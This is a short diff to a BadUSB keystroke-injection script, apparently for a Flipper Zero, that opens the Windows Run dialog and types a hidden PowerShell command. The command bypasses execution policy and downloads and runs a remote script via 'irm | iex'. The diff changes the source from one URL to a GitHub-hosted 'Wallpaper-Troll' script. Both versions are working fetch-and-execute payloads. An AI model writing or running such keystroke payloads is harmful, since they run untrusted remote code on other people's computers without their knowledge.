@@ -15,6 +15,6 @@ REM     ------------------------------------------------------------------------
 REM
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/b8n | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/0d1nss0n/Flipper-Zero-BadUSB/main/Payloads/Flip-Wallpaper-Troll/Wallpaper-Troll.ps1 | iex
 DELAY 500
 ENTER
